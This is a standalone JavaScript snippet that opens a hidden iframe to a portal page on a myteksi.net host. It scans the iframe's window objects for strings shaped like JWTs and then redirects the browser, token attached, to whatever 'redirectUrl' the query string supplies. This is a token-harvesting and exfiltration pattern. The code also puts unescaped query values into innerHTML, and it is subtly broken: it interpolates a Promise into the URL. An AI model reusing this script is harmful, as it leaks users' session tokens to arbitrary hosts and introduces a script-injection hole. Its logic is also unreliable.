(function () {
  debugger;

  // Step 1: Load vConsole from jsDelivr
  let vConsoleScript = document.createElement('script');
  vConsoleScript.src = "https://cdn.jsdelivr.net/npm/vconsole/dist/vconsole.min.js";
  document.head.appendChild(vConsoleScript);

  vConsoleScript.onload = () => {
    // Step 2: Initialize vConsole once it's loaded
    const vConsole = new window.VConsole();
    console.log('vConsole initialized'); // Confirmation message

    // Step 3: Proceed with the iframe logic
    let iframe = document.createElement('iframe');
    iframe.style.display = 'none';  // Make the iframe invisible
    iframe.src = 'https://jarvis.geo.azure.myteksi.net/codeless-portal/page/EcdR6wFAjtOJqWrkFbmdy3g==';  // Set iframe source
    document.body.appendChild(iframe);

    // Function to extract JWT from the iframe's window object
    function extractJWTFromWindow(maxDepth = 50) {
      const seen = new WeakSet();

      function scan(obj, path = "window", depth = 0) {
        if (!obj || typeof obj !== "object" || seen.has(obj) || depth > maxDepth) return null;
        seen.add(obj);
        for (const key in obj) {
          try {
            const val = obj[key];
            if (
              typeof val === "string" &&
              val.startsWith("eyJ") &&
              (val.match(/\./g) || []).length === 2
            ) {
              return val;
            } else if (typeof val === "object") {
              const result = scan(val, `${path}.${key}`, depth + 1);
              if (result) return result;
            }
          } catch (_) {}
        }
        return null;
      }

      // Wait for iframe to load before scanning its contentWindow
      return new Promise((resolve, reject) => {
        iframe.onload = () => {
          if (iframe.contentWindow) {
            resolve(scan(iframe.contentWindow));  // Scan the iframe's contentWindow
          } else {
            reject("Unable to access iframe contentWindow");
          }
        };

        iframe.onerror = () => {
          reject("Iframe loading error");
        };
      });
    }

    // Query parameters
    const qs = new URLSearchParams(location.search);
    const name = qs.get("name");
    const redirectUrl = qs.get("redirectUrl");

    // Wait for the iframe to load and extract JWT asynchronously
    let apiToken = qs.get("apiToken") || extractJWTFromWindow();

    const noDelay = qs.get("noDelay") === "true";
    const supplied = [];
    const missing = [];

    if (name) supplied.push("name");
    else missing.push("name");
    if (redirectUrl) supplied.push("redirectUrl");
    else missing.push("redirectUrl");
    if (apiToken) supplied.push("apiToken");
    else missing.push("apiToken");

    let fullHref = `${redirectUrl}?apiToken=${encodeURIComponent(apiToken)}&name=${encodeURIComponent(name)}&noDelay=true`;

    if (missing.length) {
      const container = document.createElement("div");
      container.style =
        "font-family:sans-serif;padding:20px;max-width:800px;height:100vh;box-sizing:border-box;";
      container.innerHTML = `<h2>Missing Parameters</h2>      <p><strong>Missing:</strong> ${missing.join(
        ", "
      )}</p>      <p><strong>Supplied:</strong> ${supplied.join(
        ", "
      )}</p>      <p><strong>Cannot redirect.</strong></p>`;
      document.body.innerHTML = "";
      document.body.appendChild(container);
      return;
    }

    // Use the extracted token and redirect
    apiToken.then(token => {
      fullHref = fullHref.replace(apiToken, encodeURIComponent(token));
      if (noDelay) {
        location.href = fullHref;
        return;
      }

      const container = document.createElement("div");
      container.style =
        "font-family:sans-serif;padding:20px;max-width:800px;height:100vh;box-sizing:border-box;";
      container.innerHTML = `<h2>Preparing Redirect…</h2>    <p>To: <code style='word-break:break-all'>${fullHref}</code></p>    <p>Redirecting in <span id='countdown'>5</span>s…</p>`;
      document.body.innerHTML = "";
      document.body.appendChild(container);

      let countdown = 5;
      const interval = setInterval(() => {
        countdown--;
        document.getElementById("countdown").textContent = countdown;
        if (countdown === 0) {
          clearInterval(interval);
          location.href = fullHref;
        }
      }, 1000);
    }).catch(err => {
      console.error('Error extracting JWT:', err);
    });
  };
})();
